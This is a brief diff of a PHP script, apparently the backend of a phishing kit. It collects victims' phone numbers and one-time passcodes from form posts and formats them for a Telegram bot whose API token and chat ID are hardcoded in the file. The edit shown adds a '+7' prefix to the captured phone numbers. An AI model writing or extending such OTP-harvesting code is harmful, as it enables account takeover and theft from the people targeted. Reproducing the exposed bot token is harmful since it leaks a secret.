@@ -1,6 +1,6 @@
 <?php
 
-$phone = $_POST["phone"];
+
 $type = $_POST["type"];
 
 $TELEGRAM_API_KEY = "7826075313:AAEb3TPy_QHQHd6R2qy1ek_vDAi_a49vwhw";
@@ -8,6 +8,7 @@ $TELEGRAM_CHAT_ID = "7006724996";
 
 if ($type === "phone") {
     $random = $_POST["random"];
+    $phone = "+7" . $_POST["phone"];
     $message = "#" . $random . "\nPhone: " . $phone;
 } else if ($type === "otp") {
     $random = $_POST["random"];
